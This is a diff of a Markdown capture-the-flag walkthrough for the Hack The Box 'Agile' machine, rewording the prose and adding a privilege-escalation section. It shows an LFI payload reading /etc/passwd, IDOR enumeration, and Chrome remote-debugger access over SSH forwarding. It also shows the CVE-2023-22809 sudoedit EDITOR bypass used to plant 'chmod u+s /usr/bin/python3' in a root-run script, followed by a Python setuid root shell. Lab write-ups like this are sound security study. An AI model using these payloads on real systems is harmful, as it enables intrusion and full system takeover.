@@ -6,7 +6,7 @@ https://app.hackthebox.com/machines/Agile
 
 ## Enumeration:
 
-Started with quick rustscan & found only 2 open ports : 22 & 80.
+I started with a quick rustscan and found only two open ports: 22 and 80.
 
 ```
 sudo rustscan -a 10.10.11.203 -- -sC -sV -T4 -vv -oN agile_nmap
@@ -26,13 +26,13 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-From the ports scan results I found a new domain "superpass.htb" which is running on port 80.
+From the port scan results, I found a new domain "superpass.htb" running on port 80.
 
-I browsed through the webssite & observed that it's a website for the password manager.
+I browsed through the website and observed that it is a password manager website.
 
 ![image](https://user-images.githubusercontent.com/87700008/223170926-fab167b8-95b5-4e64-a45a-a6ed05027fad.png)
 
-I then ran directory scanning onto the domain & found 3 directories :
+I then ran directory scanning on the domain and found three directories:
 
 ```
 /download
@@ -42,36 +42,36 @@ I then ran directory scanning onto the domain & found 3 directories :
 
 ![image](https://user-images.githubusercontent.com/87700008/223171286-8d0ca373-7533-4988-be1a-5e0fd8949604.png)
 
-I also checked for the VHOST running with the domain but didn't found anything.😕
+I also checked for a VHOST running with the domain, but I didn't find anything. 😕
 
 ![image](https://user-images.githubusercontent.com/87700008/223171871-6c16509d-d649-434f-8b9f-fef33dad8736.png)
 
-Next, started checking the website & registered on it using the random username & password.
+Next, I started checking the website and registered on it using a random username and password.
 
-There is an option of adding the website & username in the homepage of the website, which is providing us the random password. So, I added a random website & username to add it.
+There is an option to add a website and username on the homepage of the website, which provides us with a random password. So, I added a random website and username.
 
 ![image](https://user-images.githubusercontent.com/87700008/223444148-c85b5076-41de-404c-bf6b-aac42499ef06.png)
 
-After adding the credentials I exported the file but before that I started burp to check all the requests going while exporting the file.
+After adding the credentials, I exported the file, but before that, I started Burp to check all the requests made while exporting the file.
 
-I found that there is a 'fn' option which might indicating the filename option :
+I found that there is an 'fn' option which might indicate the filename option:
 
 ![image](https://user-images.githubusercontent.com/87700008/223445258-430ea32d-9517-4ff6-b614-4e124cf297b0.png)
 ![image](https://user-images.githubusercontent.com/87700008/223445304-4937b4eb-bb00-4460-bce6-fb6bea8386b5.png)
 
-The 'fn' option might be vulnerable to LFI. So, It tried the OG payload to check for LFI, i.e. '../etc/passwd' & it worked!
+The 'fn' option might be vulnerable to LFI. So, I tried the OG payload to check for LFI, i.e., '../etc/passwd' and it worked!
 
 ![image](https://user-images.githubusercontent.com/87700008/223446140-3f5dfff5-6a06-4996-881b-480c7be33e3c.png)
 
-Now, I am confirmed that the website is vulnerable to LFI, I enumerated further and in the downloads directory I found some error messages in which the last one is taking the input after login, using the 'fn' function & then sharing the data in .csv format.
+Now, I am confirmed that the website is vulnerable to LFI. I continued enumeration and in the downloads directory, I found some error messages, with the last one taking input after login, using the 'fn' function, and then sharing the data in CSV format.
 
 ![image](https://user-images.githubusercontent.com/87700008/223448453-1162fedb-4b3d-48bc-9fd6-3e95c4eeeee8.png)
 
-Also, in the error message there is a python file mentioned with the file path:
+Also, in the error message, there is a Python file mentioned with the file path:
     
     /app/app/superpass/views/vault_views.py
 
-I tried to extract file using the LFI & got the source code of the "vault_views.py".
+I tried to extract the file using LFI and successfully obtained the source code of "vault_views.py".
 
 ![image](https://user-images.githubusercontent.com/87700008/223449269-fcca2824-21a9-4341-bfb1-0c359b413453.png)
 
@@ -191,13 +191,13 @@ By Looking at the source code of the file there is a line which is returning the
 
 ![image](https://user-images.githubusercontent.com/87700008/223451509-cc1817cd-213d-4439-b4d3-5a2201b25b8f.png)
 
-I copied the header "/vault/row/id" and sent the response from the burp by changing the id from 0-9 manually. 
+I copied the header "/vault/row/id" and sent the response from Burp by manually changing the id from 0 to 9.
 
 For id 1 and 2 I got blank page but for id 3 I received the response with the password of hackthebox, this confirmed that the page is vulnerable to IDOR.
 
 ![image](https://user-images.githubusercontent.com/87700008/223452139-62fc2d1b-c21d-41fe-9471-4a46072da96f.png)
 
-I sent the request to intruder to check further reponses till number 9.
+I sent the request to Intruder to check further responses up to number 9.
 
 ![image](https://user-images.githubusercontent.com/87700008/223453168-4915baaa-41dd-47bc-80b2-868f8b2a4967.png)
 ![image](https://user-images.githubusercontent.com/87700008/223453234-209001f3-c5e6-47ad-95eb-370fb4a48b73.png)
@@ -218,14 +218,13 @@ Got the user flag at the corum home directory. (pwn3d! 🙂)
 
 ## Privilege Escalation :
 
-I tried to enumerate manually but didn't found much. 
-I also ran linpeas to check for the available possible priv esc vectors but didn't found anything here as well. 😕
+I attempted to perform manual enumeration to find any potential privilege escalation vectors, but I did not find much. I then ran Linpeas to help identify any possible vectors, but unfortunately, it also did not reveal any useful information. 😕
 
-Then I started checking the running processes & I found that there is some service running on an unusual port : 41829
+Next, I started analyzing the running processes and discovered that an uncommon service was running on port 41829.
 
 ![image](https://user-images.githubusercontent.com/87700008/223473444-0059787e-5cc5-4baf-b392-75241d34c18d.png)
 
-I checked what exactly running with this port & found that the chrome remote debugger service is running.
+To further investigate, I identified that the service was the Chrome Remote Debugger service. This could potentially provide an opportunity for privilege escalation, and I continued to examine the service and look for any potential vulnerabilities or misconfigurations.
 
 ![image](https://user-images.githubusercontent.com/87700008/223473716-cede6dac-dcc5-4e69-a16d-00fd9e54ddf4.png)
 
@@ -234,14 +233,14 @@ runner    103720  0.2  2.7 33989976 108756 ?     Sl   15:39   0:01              
 runner    103789  0.4  3.2 1184726304 129988 ?   Sl   15:39   0:02                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=103727 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1678194484251053 --launch-time-ticks=9058043149 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,4872513971917540447,3874534238217940035,131072 --disable-features=PaintHolding
 ```
 
-I then tried port forwarding to see the contents running on port 41829.
-To perform port forwarding I tried 'Chisel' but for some reason the Agile box is removing the chisel automatically from the system. So, Then I tried the SSH to perform port forwarding.
+To access the contents running on port 41829, I attempted port forwarding.
+To perform port forwarding I tried 'Chisel' but for some reason the Agile box is removing the chisel automatically from the system. 
+
+I then attempted to perform port forwarding using SSH:
 
     ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829
     
-Since the service is running the chrome remote debugging we can directly open the chrome/chromium browser & opne the dev tool tab using "chrome://inspect"
-
-In the configure section we can add our listening port 41829 to see the content.
+Since the service is running the Chrome remote debugging, we can directly open the Chrome/Chromium browser and access the dev tool tab using "chrome://inspect". In the configure section, we can add our listening port 41829 to see the content.
 
 ![image](https://user-images.githubusercontent.com/87700008/223483817-40753927-e43a-4f1e-9261-d037cc8f7287.png)
 
@@ -249,7 +248,7 @@ After adding the connection we can see there is a test environment visible "test
 
 ![image](https://user-images.githubusercontent.com/87700008/223484401-611d7637-5f22-447f-b778-a5a0f50fea41.png)
 
-By clicking on the inspect there is a new session started & when moved onto the '/vault' section I found 2 passwords present in the page in which one of them belongs to 'Edwards'.
+Upon clicking on 'inspect', I opened a new session and accessed the '/vault' section where I found two passwords, one of which belonged to 'Edwards'.
 
 ![image](https://user-images.githubusercontent.com/87700008/223485436-54cc8cad-8145-43ce-a5a4-8a7994400564.png)
 
@@ -257,8 +256,65 @@ I used the gathered credentials to login via SSH & logged in successfully.
 
 ![image](https://user-images.githubusercontent.com/87700008/223509592-b03d7aa7-ff59-4850-b9fe-e8a007f179d9.png)
 
-I checked the sudoers level privileges & obseved that we can open 2 files with sudoedit as dev_admin.
+After checking the sudoers level privileges, I discovered that we can open two files with sudoedit as 'dev_admin'.
 
 ![image](https://user-images.githubusercontent.com/87700008/223511132-50d1c24d-5b8a-471a-bacd-afdff0f5e283.png)
 
+
+To identify processes running with root privileges, I executed 'pspy' and discovered one such process.
+
+![image](https://user-images.githubusercontent.com/87700008/223759645-8711fd48-ede5-4f5e-a6d4-d178db385a21.png)
+
+    CMD: UID=0    PID=142549 | /bin/bash -c source /app/venv/bin/activate
+    
+I observed that the process is also owned by "dev_admin" from which we can run specific commands.
+
+![image](https://user-images.githubusercontent.com/87700008/223760224-8b09a848-2280-43a5-9336-67fc9ed15415.png)
+
+At this stage, I was looking for ways to escalate my privileges and found a vulnerability in the sudo version is vulnerable "[Sudoedit bypass in Sudo <= 1.9.12p1
+CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)"
+
+As per the blog "This behavior leads to confusion when injecting an extra double dash in the previous environment variables used to look up the editor."
+
+    EDITOR='vim -- /path/to/extra/file'
+    
+By modifying the EDITOR environment variable, we can open an additional file in the same way.
+
+We export the variable as indicated by opening /app/venv/bin/activate as an extra file :
+
+    export EDITOR='vim -- /app/venv/bin/activate'
+    
+We can open one of the 2 files that allows us to open as dev_admin at the sudoers level.
+
+![image](https://user-images.githubusercontent.com/87700008/223765305-3cebc26b-fed4-4a7d-877f-32ec1ea76cd9.png)
+
+To modify the file, we added a command at the beginning to grant suid permissions to Python.
+
+```
+# This file must be used with "source bin/activate" *from bash*
+# you cannot run it directly
+
+chmod u+s /usr/bin/python3
+```
+
+The save the file using 'wq!' and after sometime the file will be executed and python will be suid.
+
+![image](https://user-images.githubusercontent.com/87700008/223783591-a87decb5-eb30-4144-94cc-9742cedccd7c.png)
+
+Using Python3, we set our uid to '0' and then used 'su' to become root :
+
+```
+edwards@agile:~$ python3 -q
+>>> import os
+>>> os.setuid(0)
+>>> os.system("su")
+root@agile:/home/edwards# id
+uid=0(root) gid=0(root) groups=0(root)
+root@agile:/home/edwards# hostname && id
+agile
+uid=0(root) gid=0(root) groups=0(root)
+root@agile:/home/edwards# 
+```
+
+![image](https://user-images.githubusercontent.com/87700008/223784014-999ac434-7544-4b19-a89d-03481909ab86.png)
 
